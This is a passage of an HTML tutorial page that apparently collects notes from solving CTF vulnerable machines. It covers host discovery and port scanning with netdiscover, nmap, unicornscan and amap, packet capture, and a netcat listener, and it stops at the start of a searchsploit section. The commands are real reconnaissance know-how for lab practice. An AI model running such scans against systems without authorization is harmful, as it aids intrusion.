

<!doctype html>


<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-92365403-1']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();
    </script>
    <title>CTF Series : Vulnerable Machines &#8212; tech.bitvijays.com</title>
    
    <link rel="stylesheet" href="_static/bizstyle.css" type="text/css" />
    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
    
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    './',
        VERSION:     '0.1',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true,
        SOURCELINK_SUFFIX: '.txt'
      };
    </script>
    <script type="text/javascript" src="_static/jquery.js"></script>
    <script type="text/javascript" src="_static/underscore.js"></script>
    <script type="text/javascript" src="_static/doctools.js"></script>
    <script type="text/javascript" src="_static/disqus.js"></script>
    <script type="text/javascript" src="_static/bizstyle.js"></script>
    <script type="text/javascript" src="_static/collapse.js"></script>
    <link rel="search" title="Search" href="search.html" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!--[if lt IE 9]>
    <script type="text/javascript" src="_static/css3-mediaqueries.js"></script>
    <![endif]-->
  </head>
  <body role="document">
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
  <h3><a href="index.html">Table Of Contents</a></h3>
  <ul>
<li><a class="reference internal" href="#">CTF Series : Vulnerable Machines</a><ul>
<li><a class="reference internal" href="#finding-the-ip-address">Finding the IP address</a><ul>
<li><a class="reference internal" href="#netdiscover">Netdiscover</a></li>
<li><a class="reference internal" href="#nmap">Nmap</a></li>
</ul>
</li>
<li><a class="reference internal" href="#port-scanning">Port Scanning</a><ul>
<li><a class="reference internal" href="#unicornscan">Unicornscan</a></li>
<li><a class="reference internal" href="#id1">Nmap</a></li>
<li><a class="reference internal" href="#amap-application-mapper">Amap - Application mapper</a></li>
</ul>
</li>
<li><a class="reference internal" href="#listen-to-the-interface">Listen to the interface</a></li>
<li><a class="reference internal" href="#from-nothing-to-a-unprivileged-shell">From Nothing to a Unprivileged Shell</a><ul>
<li><a class="reference internal" href="#searchsploit">searchsploit</a></li>
<li><a class="reference internal" href="#seclists-org-security-mailing-list-archive">SecLists.Org Security Mailing List Archive</a></li>
<li><a class="reference internal" href="#webservices">Webservices</a><ul>
<li><a class="reference internal" href="#whatweb">whatweb</a></li>
<li><a class="reference internal" href="#put-method">PUT Method</a></li>
<li><a class="reference internal" href="#wordpress">Wordpress</a></li>
<li><a class="reference internal" href="#names-possible-usernames-possible-passwords">Names? Possible Usernames? Possible Passwords?</a></li>
<li><a class="reference internal" href="#brute-forcing-hydra">Brute forcing: hydra</a></li>
<li><a class="reference internal" href="#lfi-reading-a-php-file">LFI : Reading a php file</a></li>
</ul>
</li>
<li><a class="reference internal" href="#reverse-shells">Reverse Shells</a><ul>
<li><a class="reference internal" href="#netcat-nc">netcat (nc)</a></li>
<li><a class="reference internal" href="#php">PHP</a></li>
<li><a class="reference internal" href="#weevely">Weevely</a></li>
<li><a class="reference internal" href="#ruby">Ruby</a></li>
<li><a class="reference internal" href="#perl">Perl</a></li>
<li><a class="reference internal" href="#python">Python</a></li>
<li><a class="reference internal" href="#java">Java</a></li>
<li><a class="reference internal" href="#jsp">JSP</a></li>
<li><a class="reference internal" href="#bash-dev-tcp">Bash /dev/tcp</a></li>
<li><a class="reference internal" href="#xterm">XTerm</a></li>
<li><a class="reference internal" href="#lynx">Lynx</a></li>
<li><a class="reference internal" href="#mysql">MYSQL</a></li>
</ul>
</li>
<li><a class="reference internal" href="#spawning-a-tty-shell">Spawning a TTY Shell</a><ul>
<li><a class="reference internal" href="#id2">Python</a></li>
<li><a class="reference internal" href="#sh">sh</a></li>
<li><a class="reference internal" href="#id3">Perl</a></li>
<li><a class="reference internal" href="#id4">Ruby</a></li>
<li><a class="reference internal" href="#lua">Lua</a></li>
<li><a class="reference internal" href="#irb">IRB</a></li>
<li><a class="reference internal" href="#vi">VI</a></li>
<li><a class="reference internal" href="#id5">Nmap</a></li>
<li><a class="reference internal" href="#expect">Expect</a></li>
<li><a class="reference internal" href="#sneaky-stealthy-su-in-web-shells">Sneaky Stealthy SU in (Web) Shells</a></li>
</ul>
</li>
<li><a class="reference internal" href="#gather-information-from-files">Gather information from files</a><ul>
<li><a class="reference internal" href="#operating-system">Operating System</a></li>
<li><a class="reference internal" href="#proc-variables">/Proc Variables</a></li>
<li><a class="reference internal" href="#environment-variables">Environment Variables</a></li>
<li><a class="reference internal" href="#configuration-files">Configuration Files</a></li>
<li><a class="reference internal" href="#user-history">User History</a></li>
<li><a class="reference internal" href="#private-ssh-keys-ssh-configuration">Private SSH Keys / SSH Configuration</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell">Unprivileged shell to privileged shell</a><ul>
<li><a class="reference internal" href="#privilege-escalation-from-g0tm1lk-blog">Privilege escalation from g0tm1lk blog</a><ul>
<li><a class="reference internal" href="#what-advanced-linux-file-permissions-are-used">What &#8220;Advanced Linux File Permissions&#8221; are used?</a></li>
<li><a class="reference internal" href="#where-can-written-to-and-executed-from">Where can written to and executed from?</a></li>
<li><a class="reference internal" href="#any-problem-files">Any &#8220;problem&#8221; files?</a></li>
<li><a class="reference internal" href="#find-files-folder-owned-by-the-user">Find files/ folder owned by the user</a></li>
</ul>
</li>
<li><a class="reference internal" href="#execution-of-binary-from-relative-location-than-absolute">Execution of binary from Relative location than Absolute</a></li>
<li><a class="reference internal" href="#symlink-creation">Symlink Creation</a></li>
<li><a class="reference internal" href="#mysql-privileged-escalation">MySQL Privileged Escalation</a><ul>
<li><a class="reference internal" href="#more-information">More Information</a></li>
</ul>
</li>
<li><a class="reference internal" href="#cron-d">Cron.d</a></li>
<li><a class="reference internal" href="#sudo-l-permissions">SUDO -l Permissions</a><ul>
<li><a class="reference internal" href="#nmap-suid">nmap suid</a></li>
<li><a class="reference internal" href="#tee-suid">tee suid</a></li>
<li><a class="reference internal" href="#tcpdump">tcpdump</a></li>
<li><a class="reference internal" href="#find">find</a></li>
</ul>
</li>
<li><a class="reference internal" href="#unix-wildcards">Unix Wildcards</a><ul>
<li><a class="reference internal" href="#chown-file-reference-trick-file-owner-hijacking">Chown file reference trick (file owner hijacking)</a></li>
<li><a class="reference internal" href="#chmod-file-reference-trick">Chmod file reference trick</a></li>
<li><a class="reference internal" href="#tar-arbitrary-command-execution">Tar arbitrary command execution</a></li>
<li><a class="reference internal" href="#rsync-arbitrary-command-execution">Rsync arbitrary command execution</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#tips-and-tricks">Tips and Tricks</a><ul>
<li><a class="reference internal" href="#ftp-services">FTP Services</a></li>
<li><a class="reference internal" href="#ssh">SSH</a><ul>
<li><a class="reference internal" href="#ssh-config">ssh_config</a></li>
<li><a class="reference internal" href="#ssh-as-socks-proxy">SSH as SOCKS Proxy</a></li>
</ul>
</li>
<li><a class="reference internal" href="#http">HTTP</a><ul>
<li><a class="reference internal" href="#first-things">First things</a></li>
<li><a class="reference internal" href="#htaccess-useragent">htaccess - UserAgent</a></li>
<li><a class="reference internal" href="#cgi-bin-shellshock">CGI-BIN Shellshock</a></li>
<li><a class="reference internal" href="#xss-html-injection">XSS/ HTML Injection</a></li>
<li><a class="reference internal" href="#curl">curl</a></li>
<li><a class="reference internal" href="#http-referer">HTTP Referer</a></li>
<li><a class="reference internal" href="#data-uri">Data-URI</a></li>
<li><a class="reference internal" href="#login-pages">Login-Pages</a></li>
<li><a class="reference internal" href="#delete-tags">Delete Tags</a></li>
<li><a class="reference internal" href="#http-404-custom-page">HTTP 404 Custom Page</a></li>
</ul>
</li>
<li><a class="reference internal" href="#run-parts">run-parts</a></li>
<li><a class="reference internal" href="#sudoers-file">Sudoers file</a></li>
<li><a class="reference internal" href="#docker-security">Docker Security</a></li>
<li><a class="reference internal" href="#java-keystore-file">Java keystore file</a></li>
<li><a class="reference internal" href="#cracking-md5-hashes">Cracking MD5 Hashes</a></li>
<li><a class="reference internal" href="#steghide">Steghide</a></li>
<li><a class="reference internal" href="#git-client-privilege-escalation">Git client Privilege Escalation</a><ul>
<li><a class="reference internal" href="#git-ssh">GIT_SSH</a></li>
<li><a class="reference internal" href="#git-template-dir">GIT_TEMPLATE_DIR</a></li>
</ul>
</li>
<li><a class="reference internal" href="#metasploit-shell-upgrade">Metasploit shell upgrade</a></li>
<li><a class="reference internal" href="#password-protected-file">Password Protected File</a><ul>
<li><a class="reference internal" href="#zip-file">ZIP File</a></li>
<li><a class="reference internal" href="#rar2john">rar2john</a></li>
</ul>
</li>
<li><a class="reference internal" href="#truecrypt-files">Truecrypt Files</a></li>
<li><a class="reference internal" href="#others">Others</a></li>
</ul>
</li>
<li><a class="reference internal" href="#cyber-deception">Cyber-Deception</a><ul>
<li><a class="reference internal" href="#wordpot">Wordpot</a></li>
<li><a class="reference internal" href="#fakesmtp">FakeSMTP</a></li>
<li><a class="reference internal" href="#rubberglue">Rubberglue</a></li>
<li><a class="reference internal" href="#knockd">Knockd</a></li>
<li><a class="reference internal" href="#dcept">DCEPT</a></li>
</ul>
</li>
<li><a class="reference internal" href="#useful-tools">Useful Tools</a></li>
</ul>
</li>
</ul>

  <h3>This Page</h3>
  <ul class="this-page-menu">
    <li><a href="_sources/LFC-VulnerableMachines.rst.txt"
           rel="nofollow">Show Source</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/blob/master/docs/LFC-VulnerableMachines.rst"
           rel="nofollow">Show on GitHub</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/edit/master/docs/LFC-VulnerableMachines.rst"
           rel="nofollow">Edit on GitHub</a></li>
  </ul>
<div id="searchbox" style="display: none" role="search">
  <h3>Quick search</h3>
    <form class="search" action="search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="Go" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="ctf-series-vulnerable-machines">
<h1>CTF Series : Vulnerable Machines<a class="headerlink" href="#ctf-series-vulnerable-machines" title="Permalink to this headline">¶</a></h1>
<p>This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub, Hack the Box and others. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilities.</p>
<p>We would like to <strong>thank g0tm1lk</strong> for maintaining Vulnhub and <strong>shout-out</strong> to each and every <strong>author of the Vulnerable Machine/ write-ups</strong> submitted. Thank you for providing awesome challenges to learn from and sharing your knowledge to the community!. <strong>Thank You!!</strong></p>
<p>In solving any vulnerable machine, there are few stages:</p>
<ul class="simple">
<li>Finding the IP Address</li>
<li>Port Scanning the machine</li>
<li>Listening to the interface</li>
<li>From Nothing (No-access) to Unprivileged Shell</li>
<li>From Unprivileged shell to Privileged Shell</li>
</ul>
<p>In this blog, we have mentioned, what can be done in each stages. Have also provided Tips and Tricks for solving the VMs. Vulnerability Analysis Blog in Infrastructure Pentest Series could also be referred for exploitation of any particular services (As, it provides information such as &#8220;If you have found service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited&#8221;</p>
<div class="section" id="finding-the-ip-address">
<h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Permalink to this headline">¶</a></h2>
<div class="section" id="netdiscover">
<h3>Netdiscover<a class="headerlink" href="#netdiscover" title="Permalink to this headline">¶</a></h3>
<p>An active/ passive arp reconnaissance tool</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">netdiscover</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>
<span class="o">-</span><span class="n">i</span> <span class="n">interface</span> <span class="p">:</span> <span class="n">The</span> <span class="n">network</span> <span class="n">interface</span> <span class="n">to</span> <span class="n">sniff</span> <span class="ow">and</span> <span class="n">inject</span> <span class="n">packets</span><span class="o">.</span>
<span class="o">-</span><span class="n">r</span> <span class="nb">range</span> <span class="p">:</span> <span class="n">Scan</span> <span class="n">a</span> <span class="n">given</span> <span class="nb">range</span> <span class="n">instead</span> <span class="n">of</span> <span class="n">auto</span> <span class="n">scan</span><span class="o">.</span>

<span class="n">Example</span><span class="p">:</span>
<span class="n">netdiscover</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span><span class="o">/</span><span class="n">wlan0</span><span class="o">/</span><span class="n">vboxnet0</span><span class="o">/</span><span class="n">vmnet1</span> <span class="o">-</span><span class="n">r</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.0</span><span class="o">/</span><span class="mi">24</span>
</pre></div>
</div>
<p>Interface name for Virtualization Software</p>
<ul class="simple">
<li>Virtualbox : vboxnet</li>
<li>Vmware     : vmnet</li>
</ul>
</div>
<div class="section" id="nmap">
<h3>Nmap<a class="headerlink" href="#nmap" title="Permalink to this headline">¶</a></h3>
<p>Network exploration tool and security/ port scanner</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
<span class="o">-</span><span class="n">sP</span><span class="o">/-</span><span class="n">sn</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span><span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>

<span class="n">Example</span><span class="p">:</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sP</span><span class="o">/-</span><span class="n">sn</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.0</span><span class="o">/</span><span class="mi">24</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="port-scanning">
<h2>Port Scanning<a class="headerlink" href="#port-scanning" title="Permalink to this headline">¶</a></h2>
<p>Port scanning provides a large amount of information on open services and possible exploits that target these services. Two options</p>
<div class="section" id="unicornscan">
<h3>Unicornscan<a class="headerlink" href="#unicornscan" title="Permalink to this headline">¶</a></h3>
<p>A port scanner that utilizes its own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
  -i, --interface : interface name, like eth0 or fxp1, not normally required
  -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf&#39; for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
  Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
  Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024

 example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.
</pre></div>
</div>
</div>
<div class="section" id="id1">
<h3>Nmap<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
<p>Network exploration tool and security/ port scanner</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>

<span class="n">HOST</span> <span class="n">DISCOVERY</span><span class="p">:</span>
<span class="o">-</span><span class="n">sL</span><span class="p">:</span> <span class="n">List</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">simply</span> <span class="nb">list</span> <span class="n">targets</span> <span class="n">to</span> <span class="n">scan</span>
<span class="o">-</span><span class="n">sn</span><span class="p">:</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>
<span class="o">-</span><span class="n">Pn</span><span class="p">:</span> <span class="n">Treat</span> <span class="nb">all</span> <span class="n">hosts</span> <span class="k">as</span> <span class="n">online</span> <span class="o">--</span> <span class="n">skip</span> <span class="n">host</span> <span class="n">discovery</span>

<span class="n">SCAN</span> <span class="n">TECHNIQUES</span><span class="p">:</span>
<span class="o">-</span><span class="n">sS</span><span class="o">/</span><span class="n">sT</span><span class="o">/</span><span class="n">sA</span><span class="o">/</span><span class="n">sW</span><span class="o">/</span><span class="n">sM</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">Connect</span><span class="p">()</span><span class="o">/</span><span class="n">ACK</span><span class="o">/</span><span class="n">Window</span><span class="o">/</span><span class="n">Maimon</span> <span class="n">scans</span>
<span class="o">-</span><span class="n">sU</span><span class="p">:</span> <span class="n">UDP</span> <span class="n">Scan</span> <span class="o">-</span><span class="n">sN</span><span class="o">/</span><span class="n">sF</span><span class="o">/</span><span class="n">sX</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">Null</span><span class="p">,</span> <span class="n">FIN</span><span class="p">,</span> <span class="ow">and</span> <span class="n">Xmas</span> <span class="n">scans</span>

<span class="n">PORT</span> <span class="n">SPECIFICATION</span><span class="p">:</span>
<span class="o">-</span><span class="n">p</span> <span class="p">:</span> <span class="n">Only</span> <span class="n">scan</span> <span class="n">specified</span> <span class="n">ports</span>
<span class="n">Ex</span><span class="p">:</span> <span class="o">-</span><span class="n">p22</span><span class="p">;</span> <span class="o">-</span><span class="n">p1</span><span class="o">-</span><span class="mi">65535</span><span class="p">;</span> <span class="o">-</span><span class="n">p</span> <span class="n">U</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="n">T</span><span class="p">:</span><span class="mi">21</span><span class="o">-</span><span class="mi">25</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="n">S</span><span class="p">:</span><span class="mi">9</span>

<span class="n">SERVICE</span><span class="o">/</span><span class="n">VERSION</span> <span class="n">DETECTION</span><span class="p">:</span>
<span class="o">-</span><span class="n">sV</span><span class="p">:</span> <span class="n">Probe</span> <span class="nb">open</span> <span class="n">ports</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span> <span class="n">info</span>

<span class="n">OUTPUT</span><span class="p">:</span>
<span class="o">-</span><span class="n">oN</span><span class="o">/-</span><span class="n">oX</span><span class="o">/-</span><span class="n">oS</span><span class="o">/-</span><span class="n">oG</span> <span class="p">:</span> <span class="n">Output</span> <span class="n">scan</span> <span class="ow">in</span> <span class="n">normal</span><span class="p">,</span> <span class="n">XML</span><span class="p">,</span><span class="n">Output</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">three</span> <span class="n">major</span> <span class="n">formats</span> <span class="n">at</span> <span class="n">once</span>
<span class="o">-</span><span class="n">v</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">verbosity</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">vv</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>

<span class="n">MISC</span><span class="p">:</span> <span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">IPv6</span> <span class="n">scanning</span> <span class="o">-</span><span class="n">A</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span><span class="p">,</span> <span class="n">version</span> <span class="n">detection</span><span class="p">,</span> <span class="n">script</span> <span class="n">scanning</span><span class="p">,</span> <span class="ow">and</span> <span class="n">traceroute</span>
</pre></div>
</div>
<p>As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at <a class="reference external" href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>
<p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.</p>
</div>
<div class="section" id="amap-application-mapper">
<h3>Amap - Application mapper<a class="headerlink" href="#amap-application-mapper" title="Permalink to this headline">¶</a></h3>
<p>By using <strong>amap</strong>, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">amap</span> <span class="o">-</span><span class="n">A</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span> <span class="mi">12380</span>
<span class="n">amap</span> <span class="n">v5</span><span class="o">.</span><span class="mi">4</span> <span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">thc</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">amap</span><span class="p">)</span> <span class="n">started</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">09</span> <span class="o">-</span> <span class="n">APPLICATION</span> <span class="n">MAPPING</span> <span class="n">mode</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">http</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">http</span><span class="o">-</span><span class="n">apache</span><span class="o">-</span><span class="mi">2</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">ntp</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">ssl</span>
<span class="n">Unidentified</span> <span class="n">ports</span><span class="p">:</span> <span class="n">none</span><span class="o">.</span>
<span class="n">amap</span> <span class="n">v5</span><span class="o">.</span><span class="mi">4</span> <span class="n">finished</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">16</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="listen-to-the-interface">
<h2>Listen to the interface<a class="headerlink" href="#listen-to-the-interface" title="Permalink to this headline">¶</a></h2>
<p>We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.096292</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="o">.</span><span class="mi">36327</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.1</span><span class="o">.</span><span class="mi">4444</span><span class="p">:</span> <span class="n">Flags</span> <span class="p">[</span><span class="n">S</span><span class="p">],</span> <span class="n">seq</span> <span class="mi">861815232</span><span class="p">,</span> <span class="n">win</span> <span class="mi">16384</span><span class="p">,</span> <span class="n">options</span> <span class="p">[</span><span class="n">mss</span> <span class="mi">1460</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">sackOK</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">wscale</span> <span class="mi">3</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">TS</span> <span class="n">val</span> <span class="mi">4127458640</span> <span class="n">ecr</span> <span class="mi">0</span><span class="p">],</span> <span class="n">length</span> <span class="mi">0</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.096330</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.1</span><span class="o">.</span><span class="mi">4444</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="o">.</span><span class="mi">36327</span><span class="p">:</span> <span class="n">Flags</span> <span class="p">[</span><span class="n">R</span><span class="o">.</span><span class="p">],</span> <span class="n">seq</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ack</span> <span class="mi">861815233</span><span class="p">,</span> <span class="n">win</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span> <span class="mi">0</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.098567</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Request</span> <span class="n">who</span><span class="o">-</span><span class="n">has</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.2</span> <span class="n">tell</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">,</span> <span class="n">length</span> <span class="mi">28</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.098584</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Request</span> <span class="n">who</span><span class="o">-</span><span class="n">has</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.2</span> <span class="n">tell</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">,</span> <span class="n">length</span> <span class="mi">28</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.100756</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Request</span> <span class="n">who</span><span class="o">-</span><span class="n">has</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.3</span> <span class="n">tell</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">,</span> <span class="n">length</span> <span class="mi">28</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.100773</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Request</span> <span class="n">who</span><span class="o">-</span><span class="n">has</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.3</span> <span class="n">tell</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">,</span> <span class="n">length</span> <span class="mi">28</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.096292</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="o">.</span><span class="mi">36327</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.1</span><span class="o">.</span><span class="mi">4444</span><span class="p">:</span> <span class="n">Flags</span> <span class="p">[</span><span class="n">S</span><span class="p">],</span>
</pre></div>
</div>
<p>While listening on port 4444, we might receive a something like a base64 encoded string or some message.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>nc -lvp 4444
listening on [any] 4444 …
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh
</pre></div>
</div>
</div>
<div class="section" id="from-nothing-to-a-unprivileged-shell">
<h2>From Nothing to a Unprivileged Shell<a class="headerlink" href="#from-nothing-to-a-unprivileged-shell" title="Permalink to this headline">¶</a></h2>
<p>At this point, you would have an idea about the different services and service version running on the system. (aka figure out what webservices such as cms or software&#8217;s are running on the vulnerable machine)</p>
<div class="section" id="searchsploit">
<h3>searchsploit<a class="headerlink" href="#searchsploit" title="Permalink to this headline">¶</a></h3>
<p>Exploit Database Archive Search</p>
<p>First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># nmap -sV -A 172.16.73.128</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
